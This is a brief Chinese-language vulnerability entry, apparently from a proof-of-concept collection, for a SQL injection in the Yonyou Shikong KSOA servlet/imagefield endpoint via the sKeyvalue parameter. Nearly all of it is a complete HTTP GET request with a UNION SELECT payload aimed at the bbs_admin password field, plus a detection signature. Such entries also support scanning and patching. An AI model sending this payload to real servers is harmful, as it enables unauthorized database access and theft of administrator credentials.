# 用友时空KSOAservletimagefield文件sKeyvalue参数SQL注入

用友 ｜ SQL注入 ｜ —
- **请求**：`GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1`
- **响应特征**：-1